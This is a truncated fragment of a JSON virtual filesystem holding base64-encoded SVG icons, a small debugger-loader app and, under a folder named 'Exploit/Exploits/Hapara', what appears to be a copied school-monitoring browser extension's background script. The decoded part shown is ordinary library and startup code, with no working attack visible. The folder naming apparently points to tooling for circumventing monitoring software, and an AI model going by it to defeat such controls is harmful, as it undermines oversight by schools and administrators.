"PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTkgMTZoMlY4SDl2OHptMy0xNEM2LjQ4IDIgMiA2LjQ4IDIgMTJzNC40OCAxMCAxMCAxMCAxMC00LjQ4IDEwLTEwUzE3LjUyIDIgMTIgMnptMCAxOGMtNC40MSAwLTgtMy41OS04LThzMy41OS04IDgtOCA4IDMuNTkgOCA4LTMuNTkgOC04IDh6bTEtNGgyVjhoLTJ2OHoiLz4NCjwvc3ZnPg==", "/system/res/drawable": {}, "/system/res/drawable/moreLight.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTEyIDhjMS4xIDAgMi0uOSAyLTJzLS45LTItMi0yLTIgLjktMiAyIC45IDIgMiAyem0wIDJjLTEuMSAwLTIgLjktMiAycy45IDIgMiAyIDItLjkgMi0yLS45LTItMi0yem0wIDZjLTEuMSAwLTIgLjktMiAycy45IDIgMiAyIDItLjkgMi0yLS45LTItMi0yeiIvPg0KPC9zdmc+", "/system/res/drawable/arrowBackDark.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTIwIDExSDcuODNsNS41OS01LjU5TDEyIDRsLTggOCA4IDggMS40MS0xLjQxTDcuODMgMTNIMjB2LTJ6Ii8+DQo8L3N2Zz4=", "/system/res/drawable/enterFullscreenLight.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTcgMTRINXY1aDV2LTJIN3YtM3ptLTItNGgyVjdoM1Y1SDV2NXptMTIgN2gtM3YyaDV2LTVoLTJ2M3pNMTQgNXYyaDN2M2gyVjVoLTV6Ii8+DQo8L3N2Zz4=", "/system/res/drawable/moreDark.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTEyIDhjMS4xIDAgMi0uOSAyLTJzLS45LTItMi0yLTIgLjktMiAyIC45IDIgMiAyem0wIDJjLTEuMSAwLTIgLjktMiAycy45IDIgMiAyIDItLjkgMi0yLS45LTItMi0yem0wIDZjLTEuMSAwLTIgLjktMiAycy45IDIgMiAyIDItLjkgMi0yLS45LTItMi0yeiIvPg0KPC9zdmc+", "/system/res/drawable/deleteFolderDark.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMTUgMTZoNHYyaC00em0wLThoN3YyaC03em0wIDRoNnYyaC02ek0zIDE4YzAgMS4xLjkgMiAyIDJoNmMxLjEgMCAyLS45IDItMlY4SDN2MTB6TTE0IDVoLTNsLTEtMUg2TDUgNUgydjJoMTJ6Ii8+DQogICAgPHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPg0KPC9zdmc+", "/system/res/drawable/forward10.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+DQogICAgPGRlZnM+DQogICAgICAgIDxwYXRoIGQ9Ik0yNCAyNEgwVjBoMjR2MjR6IiBpZD0iYSIvPg0KICAgIDwvZGVmcz4NCiAgICA8Y2xpcFBhdGggaWQ9ImIiPg0KICAgICAgICA8dXNlIG92ZXJmbG93PSJ2aXNpYmxlIiB4bGluazpocmVmPSIjYSIvPg0KICAgIDwvY2xpcFBhdGg+DQogICAgPHBhdGggY2xpcC1wYXRoPSJ1cmwoI2IpIiBkPSJNNCAxM2MwIDQuNCAzLjYgOCA4IDhzOC0zLjYgOC04aC0yYzAgMy4zLTIuNyA2LTYgNnMtNi0yLjctNi02IDIuNy02IDYtNnY0bDUtNS01LTV2NGMtNC40IDAtOCAzLjYtOCA4em02LjggM0gxMHYtMy4zTDkgMTN2LS43bDEuOC0uNmguMVYxNnptNC4zLTEuOGMwIC4zIDAgLjYtLjEuOGwtLjMuNnMtLjMuMy0uNS4zLS40LjEtLjYuMS0uNCAwLS42LS4xLS4zLS4yLS41LS4zLS4yLS4zLS4zLS42LS4xLS41LS4xLS44di0uN2MwLS4zIDAtLjYuMS0uOGwuMy0uNnMuMy0uMy41LS4zLjQtLjEuNi0uMS40IDAgLjYuMS4zLjIuNS4zLjIuMy4zLjYuMS41LjEuOHYuN3ptLS44LS44di0uNXMtLjEtLjItLjEtLjMtLjEtLjEtLjItLjItLjItLjEtLjMtLjEtLjIgMC0uMy4xbC0uMi4ycy0uMS4yLS4xLjN2MnMuMS4yLjEuMy4xLjEuMi4yLjIuMS4zLjEuMiAwIC4zLS4xbC4yLS4ycy4xLS4yLjEtLjN2LTEuNXoiLz4NCjwvc3ZnPg==", "/data/config.json": "ew0KCSJ2ZXJzaW9uIjogMCwNCgkicGVybWlzc2lvbnMiOiB7fQ0KfQ==", "/system/app/FireBug/app.js": "KGZ1bmN0aW9uKCkgew0KCSJ1c2Ugc3RyaWN0IjsNCglkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCJhIikuaHJlZiA9IGBqYXZhc2NyaXB0Og0KCXRyeXsNCgkJKGZ1bmN0aW9uKCkgew0KCQkJaWYgKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJGaXJlYnVnTGl0ZSIpKSB7DQoJCQkJIHJldHVybjsNCgkJCX0NCgkJCXZhciBlbGVtZW50ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7DQoJCQllbGVtZW50LmlkID0gIkZpcmVidWdMaXRlIjsNCgkJCWVsZW1lbnQuc3JjID0gImZpbGVzeXN0ZW06YCArIGxvY2F0aW9uLmhvc3QgKyBgL3Jlcy9maXJlYnVnLWxpdGUtYmV0YS5qcyNzdGFydE9wZW5lZCI7DQoJCQllbGVtZW50LkZpcmVidWdMaXRlID0gIjQiOw0KCQkJZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChlbGVtZW50KTsNCgkJCXZhciBpbWcgPSBuZXcgSW1hZ2U7DQoJCQllbGVtZW50LnNldEF0dHJpYnV0ZSgic3JjIiwgImZpbGVzeXN0ZW06YCArIGxvY2F0aW9uLmhvc3QgKyBgL3Jlcy9zcHJpdGUucG5nIik7DQoJCX0pKCk7DQoJfWNhdGNoIChlcnIpIHsNCgkJYWxlcnQoSlNPTi5zdHJpbmdpZnkoZXJyKSk7DQoJfQ0KCWA7DQp9KSgpOw==", "/system/app/FireBug/manifest.json": "ew0KCSJVSUQiOiJzdG9ja19maXJlYnVnX2luc3BlY3RvciIsDQoJIm5hbWUiOiJGaXJlQnVnIiwNCgkiaWNvIjoicmVzL2RyYXdhYmxlL2Zhdmljby5zdmciLA0KCSJhY3Rpdml0aWVzIjp7DQoJCSJtYWluIjogew0KCQkJImljbyI6InJlcy9kcmF3YWJsZS9mYXZpY28uc3ZnIiwNCgkJCSJwYXRoIjoiaW5kZXguaHRtbCINCgkJfQ0KCX0sDQoJInBlcm1pc3Npb25zIjpbDQoJXQ0KfQ==", "/system/res": {}, "/system/app/Exploit/Exploits": {}, "/system/app/Exploit/Exploits/Hapara/background-d7574b7bdf62bf457103.js": "IWZ1bmN0aW9uKGUpe2Z1bmN0aW9uIHQocil7aWYobltyXSlyZXR1cm4gbltyXS5leHBvcnRzO3ZhciBpPW5bcl09e2V4cG9ydHM6e30saWQ6cixsb2FkZWQ6ITF9O3JldHVybiBlW3JdLmNhbGwoaS5leHBvcnRzLGksaS5leHBvcnRzLHQpLGkubG9hZGVkPSEwLGkuZXhwb3J0c312YXIgbj17fTtyZXR1cm4gdC5tPWUsdC5jPW4sdC5wPSIiLHQoMCl9KFsNCg0KLyogPCEtLSBtb21lbnQuanMgKi8NCmZ1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7bigxNzkpLG4oMTQ4KSxuKDMxMSkuaW5pdGlhbGlzZSgpO3ZhciByPW4oNSksaT1uKDMpKCJiYWNrZ3JvdW5kIik7aS5pKCJBcHBsaWNhdGlvbiBzdGFydGluZyAoIituKDUpLmVudmlyb25tZW50KyIgZW52aXJvbm1lbnQpLi4iKTt2YXIgcz1uKDExKTtzLm9uUG9zc2libHlVbmhhbmRsZWRSZWplY3Rpb24oZnVuY3Rpb24oZSl7aS5lKCJVbmhhbmRsZWRSZWplY3Rpb24gZnJvbSBibHVlYmlyZCIsZSl9KTt2YXIgbz1uKDQpO28uc3RhcnQoKSwicHJvZHVjdGlvbiIhPT1yLmVudmlyb25tZW50JiYodG9wLmQ9e2FwcDpvLGNvbmZpZzpyLGxvZzpuKDMpLGFwaTpuKDE4KSxNZXNzYWdlOm4oMjIpLG1vbWVudDpuKDEpLHRhYkxvY2tpbmc6bigzMiksUHJvbWlzZTpzLHJheWd1bjpuKDMxMSksd2F0Y2hpbmc6bigyNSl9LHRvcC5ydW5fdGVzdHM9ZnVuY3Rpb24oKXtjaHJvbWUudGFicy5jcmVhdGUoe3VybDpjaHJvbWUuZXh0ZW5zaW9uLmdldFVSTCgidGVzdC9TcGVjUnVubmVyLmh0bWwiKSxhY3RpdmU6ITB9KX0pLGNocm9tZS5icm93c2VyQWN0aW9uLm9uQ2xpY2tlZC5hZGRMaXN0ZW5lcihmdW5jdGlvbigpe2Nocm9tZS50YWJzLmNyZWF0ZSh7dXJsOmNocm9tZS5leHRlbnNpb24uZ2V0VVJMKCJkaWFnbm9zdGljcy5odG1sIiksYWN0aXZlOiEwfSl9KX0sZnVuY3Rpb24oZSx0LG4peyhmdW5jdGlvbihlKXshZnVuY3Rpb24odCxuKXtlLmV4cG9ydHM9bigpfSh0aGlzLGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHQoKXtyZXR1cm4gR24uYXBwbHkobnVsbCxhcmd1bWVudHMpfWZ1bmN0aW9uIHIoZSl7R249ZX1mdW5jdGlvbiBpKGUpe3JldHVybiJbb2JqZWN0IEFycmF5XSI9PT1PYmplY3QucHJvdG90eXBlLnRvU3RyaW5nLmNhbGwoZSl9ZnVuY3Rpb24gcyhlKXtyZXR1cm4gZSBpbnN0YW5jZW9mIERhdGV8fCJbb2JqZWN0IERhdGVdIj09PU9iamVjdC5wcm90b3R5cGUudG9TdHJpbmcuY2FsbChlKX1mdW5jdGlvbiBvKGUsdCl7dmFyIG4scj1bXTtmb3Iobj0wO248ZS5sZW5ndGg7KytuKXIucHVzaCh0KGVbbl0sbikpO3JldHVybiByfWZ1bmN0aW9uIGEoZSx0KXtyZXR1cm4gT2JqZWN0LnByb3RvdHlwZS5oYXNPd25Qcm9wZXJ0eS5jYWxsKGUsdCl9ZnVuY3Rpb24gdShlLHQpe2Zvcih2YXIgbiBpbiB0KWEodCxuKSYmKGVbbl09dFtuXSk7cmV0dXJuIGEodCwidG9TdHJpbmciKSYmKGUudG9TdHJpbmc9dC50b1N0cmluZyksYSh0LCJ2YWx1ZU9mIikmJihlLnZhbHVlT2Y9dC52YWx1ZU9mKSxlfWZ1bmN0aW9uIGMoZSx0LG4scil7cmV0dXJuIEhlKGUsdCxuLHIsITApLnV0YygpfWZ1bmN0aW9uIGwoKXtyZXR1cm57ZW1wdHk6ITEsdW51c2VkVG9rZW5zOltdLHVudXNlZElucHV0OltdLG92ZXJmbG93Oi0yLGNoYXJzTGVmdE92ZXI6MCxudWxsSW5wdXQ6ITEsaW52YWxpZE1vbnRoOm51bGwsaW52YWxpZEZvcm1hdDohMSx1c2VySW52YWxpZGF0ZWQ6ITEsaXNvOiExfX1mdW5jdGlvbiBkKGUpe3JldHVybiBudWxsPT1lLl9wZiYmKGUuX3BmPWwoKSksZS5fcGZ9ZnVuY3Rpb24gaChlKXtpZihudWxsPT1lLl9pc1ZhbGlkKXt2YXIgdD1kKGUpO2UuX2lzVmFsaWQ9IShpc05hTihlLl9kLmdldFRpbWUoKSl8fCEodC5vdmVyZmxvdzwwKXx8dC5lbXB0eXx8dC5pbnZhbGlkTW9udGh8fHQuaW52YWxpZFdlZWtkYXl8fHQubnVsbElucHV0fHx0LmludmFsaWRGb3JtYXR8fHQudXNlckludmFsaWRhdGVkKSxlLl9zdHJpY3QmJihlLl9pc1ZhbGlkPWUuX2lzVmFsaWQmJjA9PT10LmNoYXJzTGVmdE92ZXImJjA9PT10LnVudXNlZFRva2Vucy5sZW5ndGgmJnZvaWQgMD09PXQuYmlnSG91cil9cmV0dXJuIGUuX2lzVmFsaWR9ZnVuY3Rpb24gZihlKXt2YXIgdD1jKE5hTik7cmV0dXJuIG51bGwhPWU/dShkKHQpLGUpOmQodCkudXNlckludmFsaWRhdGVkPSEwLHR9ZnVuY3Rpb24gcChlKXtyZXR1cm4gdm9pZCAwPT09ZX1mdW5jdGlvbiBfKGUsdCl7dmFyIG4scixpO2lmKHAodC5faXNBTW9tZW50T2JqZWN0KXx8KGUuX2lzQU1vbWVudE9iamVjdD10Ll9pc0FNb21lbnRPYmplY3QpLHAodC5faSl8fChlLl9pPXQuX2kpLHAodC5fZil8fChlLl9mPXQuX2YpLHAodC5fbCl8fChlLl9sPXQuX2wpLHAodC5fc3RyaWN0KXx8KGUuX3N0cmljdD10Ll9zdHJpY3QpLHAodC5fdHptKXx8KGUuX3R6bT10Ll90em0pLHAodC5faXNVVEMpfHwoZS5faXNVVEM9dC5faXNVVEMpLHAodC5fb2Zmc2V0KXx8KGUuX29mZnNldD10Ll9vZmZzZXQpLHAodC5fcGYpfHwoZS5fcGY9ZCh0KSkscCh0Ll9sb2NhbGUpfHwoZS5fbG9jYWxlPXQuX2xvY2FsZSksUW4ubGVuZ3RoPjApZm9yKG4gaW4gUW4pcj1RbltuXSxpPXRbcl0scChpKXx8KGVbcl09aSk7cmV0dXJuIGV9ZnVuY3Rpb24gbShlKXtfKHRoaXMsZSksdGhpcy5fZD1uZXcgRGF0ZShudWxsIT1lLl9kP2UuX2QuZ2V0VGltZSgpOk5hTiksS249PT0hMSYmKEtuPSEwLHQudXBkYXRlT2Zmc2V0KHRoaXMpLEtuPSExKX1mdW5jdGlvbiB5KGUpe3JldHVybiBlIGluc3RhbmNlb2YgbXx8bnVsbCE9ZSYmbnVsbCE9ZS5faXNBTW9tZW50T2JqZWN0fWZ1bmN0aW9uIGcoZSl7cmV0dXJuIDA+ZT9NYXRoLmNlaWwoZSk6TWF0aC5mbG9vcihlKX1mdW5jdGlvbiB2KGUpe3ZhciB0PStlLG49MDtyZXR1cm4gMCE9PXQmJmlzRmluaXRlKHQpJiYobj1nKHQpKSxufWZ1bmN0aW9uIGIoZSx0LG4pe3ZhciByLGk9TWF0aC5taW4oZS5sZW5ndGgsdC5sZW5ndGgpLHM9TWF0aC5hYnMoZS5sZW5ndGgtdC5sZW5ndGgpLG89MDtmb3Iocj0wO2k+cjtyKyspKG4mJmVbcl0hPT10W3JdfHwhbiYmdihlW3JdKSE9PXYodFtyXSkpJiZvKys7cmV0dXJuIG8rc31mdW5jdGlvbiBNKCl7fWZ1bmN0aW9uIEwoZSl7cmV0dXJuIGU/ZS50b0xvd2VyQ2FzZSgpLnJlcGxhY2UoIl8iLCItIik6ZX1mdW5jdGlvbiBrKGUpe2Zvcih2YXIgdCxuLHIsaSxzPTA7czxlLmxlbmd0aDspe2ZvcihpPUwoZVtzXSkuc3BsaXQoIi0iKSx0PWkubGVuZ3RoLG49TChlW3MrMV0pLG49bj9uLnNwbGl0KCItIik6bnVsbDt0PjA7KXtpZihyPXcoaS5zbGljZSgwLHQpLmpvaW4oIi0iKSkpcmV0dXJuIHI7aWYobiYmbi5sZW5ndGg+PXQmJmIoaSxuLCEwKT49dC0xKWJyZWFrO3QtLX1zKyt9cmV0dXJuIG51bGx9ZnVuY3Rpb24gdyh0KXt2YXIgcj1udWxsO2lmKCFablt0XSYmInVuZGVmaW5lZCIhPXR5cGVvZiBlJiZlJiZlLmV4cG9ydHMpdHJ5e3I9WG4uX2FiYnIsbigxODApKCIuLyIrdCksVChyKX1jYXRjaChpKXt9cmV0dXJuIFpuW3RdfWZ1bmN0aW9uIFQoZSx0KXt2YXIgbjtyZXR1cm4gZSYmKG49cCh0KT9EKGUpOlkoZSx0KSxuJiYoWG49bikpLFhuLl9hYmJyfWZ1bmN0aW9uIFkoZSx0KXtyZXR1cm4gbnVsbCE9PXQ/KHQuYWJicj1lLFpuW2VdPVpuW2VdfHxuZXcgTSxabltlXS5zZXQodCksVChlKSxabltlXSk6KGRlbGV0ZSBabltlXSxudWxsKX1mdW5jdGlvbiBEKGUpe3ZhciB0O2lmKGUmJmUuX2xvY2FsZSYmZS5fbG9jYWxlLl9hYmJyJiYoZT1lLl9sb2NhbGUuX2FiYnIpLCFlKXJldHVybiBYbjtpZighaShlKSl7aWYodD13KGUpKXJldHVybiB0O2U9W2VdfXJldHVybiBrKGUpfWZ1bmN0aW9uIFMoZSx0KXt2YXIgbj1lLnRvTG93ZXJDYXNlKCk7ZXJbbl09ZXJbbisicyJdPWVyW3RdPWV9ZnVuY3Rpb24geChlKXtyZXR1cm4ic3RyaW5nIj09dHlwZW9mIGU/ZXJbZV18fGVyW2UudG9Mb3dlckNhc2UoKV06dm9pZCAwfWZ1bmN0aW9uIGooZSl7dmFyIHQsbixyPXt9O2ZvcihuIGluIGUpYShlLG4pJiYodD14KG4pLHQmJihyW3RdPWVbbl0pKTtyZXR1cm4gcn1mdW5jdGlvbiBIKGUpe3JldHVybiBlIGluc3RhbmNlb2YgRnVuY3Rpb258fCJbb2JqZWN0IEZ1bmN0aW9uXSI9PT1PYmplY3QucHJvdG90eXBlLnRvU3RyaW5nLmNhbGwoZSl9ZnVuY3Rpb24gUChlLG4pe3JldHVybiBmdW5jdGlvbihyKXtyZXR1cm4gbnVsbCE9cj8oRih0aGlzLGUsciksdC51cGRhdGVPZmZzZXQodGhpcyxuKSx0aGlzKTpFKHRoaXMsZSl9fWZ1bmN0aW9uIEUoZSx0KXtyZXR1cm4gZS5pc1ZhbGlkKCk/ZS5fZFsiZ2V0IisoZS5faXNVVEM/IlVUQyI6IiIpK3RdKCk6TmFOfWZ1bmN0aW9uIEYoZSx0LG4pe2UuaXNWYWxpZCgpJiZlLl9kWyJzZXQiKyhlLl9pc1VUQz8iVVRDIjoiIikrdF0obil9ZnVuY3Rpb24gQyhlLHQpe3ZhciBuO2lmKCJvYmplY3QiPT10eXBlb2YgZSlmb3IobiBpbiBlKXRoaXMuc2V0KG4sZVtuXSk7ZWxzZSBpZihlPXgoZSksSCh0aGlzW2VdKSlyZXR1cm4gdGhpc1tlXSh0KTtyZXR1cm4gdGhpc31mdW5jdGlvbiBBKGUsdCxuKXt2YXIgcj0iIitNYXRoLmFicyhlKSxpPXQtci5sZW5ndGgscz1lPj0wO3JldHVybihzP24/IisiOiIiOiItIikrTWF0aC5wb3coMTAsTWF0aC5tYXgoMCxpKSkudG9TdHJpbmcoKS5zdWJzdHIoMSkrcn1mdW5jdGlvbiBPKGUsdCxuLHIpe3ZhciBpPXI7InN0cmluZyI9PXR5cGVvZiByJiYoaT1mdW5jdGlvbigpe3JldHVybiB0aGlzW3JdKCl9KSxlJiYoaXJbZV09aSksdCYmKGlyW3RbMF1dPWZ1bmN0aW9uKCl7cmV0dXJuIEEoaS5hcHBseSh0aGlzLGFyZ3VtZW50cyksdFsxXSx0WzJdKX0pLG4mJihpcltuXT1mdW5jdGlvbigpe3JldHVybiB0aGlzLmxvY2FsZURhdGEoKS5vcmRpbmFsKGkuYXBwbHkodGhpcyxhcmd1bWVudHMpLGUpfSl9ZnVuY3Rpb24gUihlKXtyZXR1cm4gZS5tYXRjaCgvXFtbXHNcU10vKT9lLnJlcGxhY2UoL15cW3xcXSQvZywiIik6ZS5yZXBsYWNlKC9cXC9nLCIiKX1mdW5jdGlvbiBOKGUpe3ZhciB0LG4scj1lLm1hdGNoKHRyKTtmb3IodD0wLG49ci5sZW5ndGg7bj50O3QrKylpcltyW3RdXT9yW3RdPWlyW3JbdF1dOnJbdF09UihyW3RdKTtyZXR1cm4gZnVuY3Rpb24oaSl7dmFyIHM9IiI7Zm9yKHQ9MDtuPnQ7dCsrKXMrPXJbdF1pbnN0YW5jZW9mIEZ1bmN0aW9uP3JbdF0uY2FsbChpLGUpOnJbdF07cmV0dXJuIHN9fWZ1bmN0aW9uIEkoZSx0KXtyZXR1cm4gZS5pc1ZhbGlkKCk/KHQ9Vyh0LGUubG9jYWxlRGF0YSgpKSxyclt0XT1yclt0XXx8Tih0KSxyclt0XShlKSk6ZS5sb2NhbGVEYXRhKCkuaW52YWxpZERhdGUoKX1mdW5jdGlvbiBXKGUsdCl7ZnVuY3Rpb24gbihlKXtyZXR1cm4gdC5sb25nRGF0ZUZvcm1hdChlKXx8ZX12YXIgcj01O2Zvcihuci5sYXN0SW5kZXg9MDtyPj0wJiZuci50ZXN0KGUpOyllPWUucmVwbGFjZShucixuKSxuci5sYXN0SW5kZXg9MCxyLT0xO3JldHVybiBlfWZ1bmN0aW9uIFUoZSx0LG4pe0xyW2VdPUgodCk/dDpmdW5jdGlvbihlLHIpe3JldHVybiBlJiZuP246dH19ZnVuY3Rpb24geihlLHQpe3JldHVybiBhKExyLGUpP0xyW2VdKHQuX3N0cmljdCx0Ll9sb2NhbGUpOm5ldyBSZWdFeHAocShlKSl9ZnVuY3Rpb24gcShlKXtyZXR1cm4gSihlLnJlcGxhY2UoIlxcIiwiIikucmVwbGFjZSgvXFwoXFspfFxcKFxdKXxcWyhbXlxdXFtdKilcXXxcXCguKS9nLGZ1bmN0aW9uKGUsdCxuLHIsaSl7cmV0dXJuIHR8fG58fHJ8fGl9KSl9ZnVuY3Rpb24gSihlKXtyZXR1cm4gZS5yZXBsYWNlKC9bLVwvXFxeJCorPy4oKXxbXF17fV0vZywiXFwkJiIpfWZ1bmN0aW9uICQoZSx0KXt2YXIgbixyPXQ7Zm9yKCJzdHJpbmciPT10eXBlb2YgZSYmKGU9W2VdKSwibnVtYmVyIj09dHlwZW9mIHQmJihyPWZ1bmN0aW9uKGUsbil7blt0XT12KGUpfSksbj0wO248ZS5sZW5ndGg7bisrKWtyW2Vbbl1dPXJ9ZnVuY3Rpb24gQihlLHQpeyQoZSxmdW5jdGlvbihlLG4scixpKXtyLl93PXIuX3d8fHt9LHQoZSxyLl93LHIsaSl9KX1mdW5jdGlvbiBWKGUsdCxuKXtudWxsIT10JiZhKGtyLGUpJiZrcltlXSh0LG4uX2EsbixlKX1mdW5jdGlvbiBHKGUsdCl7cmV0dXJuIG5ldyBEYXRlKERhdGUuVVRDKGUsdCsxLDApKS5nZXRVVENEYXRlKCl9ZnVuY3Rpb24gWChlLHQpe3JldHVybiBpKHRoaXMuX21vbnRocyk/dGhpcy5fbW9udGhzW2UubW9udGgoKV06dGhpcy5fbW9udGhzW0VyLnRlc3QodCk/ImZvcm1hdCI6InN0YW5kYWxvbmUiXVtlLm1vbnRoKCldfWZ1bmN0aW9uIFEoZSx0KXtyZXR1cm4gaSh0aGlzLl9tb250aHNTaG9ydCk/dGhpcy5fbW9udGhzU2hvcnRbZS5tb250aCgpXTp0aGlzLl9tb250aHNTaG9ydFtFci50ZXN0KHQpPyJmb3JtYXQiOiJzdGFuZGFsb25lIl1bZS5tb250aCgpXX1mdW5jdGlvbiBLKGUsdCxuKXt2YXIgcixpLHM7Zm9yKHRoaXMuX21vbnRoc1BhcnNlfHwodGhpcy5fbW9udGhzUGFyc2U9W10sdGhpcy5fbG9uZ01vbnRoc1BhcnNlPVtdLHRoaXMuX3Nob3J0TW9udGhzUGFyc2U9W10pLHI9MDsxMj5yO3IrKyl7aWYoaT1jKFsyZTMscl0pLG4mJiF0aGlzLl9sb25nTW9udGhzUGFyc2Vbcl0mJih0aGlzLl9sb25nTW9udGhzUGFyc2Vbcl09bmV3IFJlZ0V4cCgiXiIrdGhpcy5tb250aHMoaSwiIikucmVwbGFjZSgiLiIsIiIpKyIkIiwiaSIpLHRoaXMuX3Nob3J0TW9udGhzUGFyc2Vbcl09bmV3IFJlZ0V4cCgiXiIrdGhpcy5tb250aHNTaG9ydChpLCIiKS5yZXBsYWNlKCIuIiwiIikrIiQiLCJpIikpLG58fHRoaXMuX21vbnRoc1BhcnNlW3JdfHwocz0iXiIrdGhpcy5tb250aHMoaSwiIikrInxeIit0aGlzLm1vbnRoc1Nob3J0KGksIiIpLHRoaXMuX21vbnRoc1BhcnNlW3JdPW5ldyBSZWdFeHAocy5yZXBsYWNlKCIuIiwiIiksImkiKSksbiYmIk1NTU0iPT09dCYmdGhpcy5fbG9uZ01vbnRoc1BhcnNlW3JdLnRlc3QoZSkpcmV0dXJuIHI7aWYobiYmIk1NTSI9PT10JiZ0aGlzLl9zaG9ydE1vbnRoc1BhcnNlW3JdLnRlc3QoZSkpcmV0dXJuIHI7aWYoIW4mJnRoaXMuX21vbnRoc1BhcnNlW3JdLnRlc3QoZSkpcmV0dXJuIHJ9fWZ1bmN0aW9uIFooZSx0KXt2YXIgbjtyZXR1cm4gZS5pc1ZhbGlkKCk/InN0cmluZyI9PXR5cGVvZiB0JiYodD1lLmxvY2FsZURhdGEoKS5tb250aHNQYXJzZSh0KSwibnVtYmVyIiE9dHlwZW9mIHQpP2U6KG49TWF0aC5taW4oZS5kYXRlKCksRyhlLnllYXIoKSx0KSksZS5fZFsic2V0IisoZS5faXNVVEM/IlVUQyI6IiIpKyJNb250aCJdKHQsbiksZSk6ZX1mdW5jdGlvbiBlZShlKXtyZXR1cm4gbnVsbCE9ZT8oWih0aGlzLGUpLHQudXBkYXRlT2Zmc2V0KHRoaXMsITApLHRoaXMpOkUodGhpcywiTW9udGgiKX1mdW5jdGlvbiB0ZSgpe3JldHVybiBHKHRoaXMueWVhcigpLHRoaXMubW9udGgoKSl9ZnVuY3Rpb24gbmUoZSl7cmV0dXJuIHRoaXMuX21vbnRoc1BhcnNlRXhhY3Q/KGEodGhpcywiX21vbnRoc1JlZ2V4Iil8fGllLmNhbGwodGhpcyksZT90aGlzLl9tb250aHNTaG9ydFN0cmljdFJlZ2V4OnRoaXMuX21vbnRoc1Nob3J0UmVnZXgpOnRoaXMuX21vbnRoc1Nob3J0U3RyaWN0UmVnZXgmJmU/dGhpcy5fbW9udGhzU2hvcnRTdHJpY3RSZWdleDp0aGlzLl9tb250aHNTaG9ydFJlZ2V4fWZ1bmN0aW9uIHJlKGUpe3JldHVybiB0aGlzLl9tb250aHNQYXJzZUV4YWN0PyhhKHRoaXMsIl9tb250aHNSZWdleCIpfHxpZS5jYWxsKHRoaXMpLGU/dGhpcy5fbW9udGhzU3RyaWN0UmVnZXg6dGhpcy5fbW9udGhzUmVnZXgpOnRoaXMuX21vbnRoc1N0cmljdFJlZ2V4JiZlP3RoaXMuX21vbnRoc1N0cmljdFJlZ2V4OnRoaXMuX21vbnRoc1JlZ2V4fWZ1bmN0aW9uIGllKCl7ZnVuY3Rpb24gZShlLHQpe3JldHVybiB0Lmxlbmd0aC1lLmxlbmd0aH12YXIgdCxuLHI9W10saT1bXSxzPVtdO2Zvcih0PTA7MTI+dDt0Kyspbj1jKFsyZTMsdF0pLHIucHVzaCh0aGlzLm1vbnRoc1Nob3J0KG4sIiIpKSxpLnB1c2godGhpcy5tb250aHMobiwiIikpLHMucHVzaCh0aGlzLm1vbnRocyhuLCIiKSkscy5wdXNoKHRoaXMubW9udGhzU2hvcnQobiwiIikpO2ZvcihyLnNvcnQoZSksaS5zb3J0KGUpLHMuc29ydChlKSx0PTA7MTI+dDt0Kyspclt0XT1KKHJbdF0pLGlbdF09SihpW3RdKSxzW3RdPUooc1t0XSk7dGhpcy5fbW9udGhzUmVnZXg9bmV3IFJlZ0V4cCgiXigiK3Muam9pbigifCIpKyIpIiwiaSIpLHRoaXMuX21vbnRoc1Nob3J0UmVnZXg9dGhpcy5fbW9udGhzUmVnZXgsdGhpcy5fbW9udGhzU3RyaWN0UmVnZXg9bmV3IFJlZ0V4cCgiXigiK2kuam9pbigifC